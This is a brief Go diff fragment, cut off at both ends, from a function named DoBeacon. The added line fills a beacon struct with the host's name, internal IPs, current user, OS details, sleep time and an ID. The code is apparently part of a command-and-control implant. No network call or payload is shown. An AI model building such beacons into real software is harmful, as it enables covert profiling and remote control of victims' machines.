@@ -43,4 +43,6 @@ func DoBeacon(url string) ([]byte, error) {
 	}
 
 	// build beacon
-	mybeacon := communication.Beacon{Ho
+	mybeacon := communication.Beacon{Hostname: HOSTNAME, InternalIPS: ips, CurrentUser: USERNAME, OS: OSINFO, Sleeptime: config.Sleeptime, UID: UID}
+
+	// convert bea
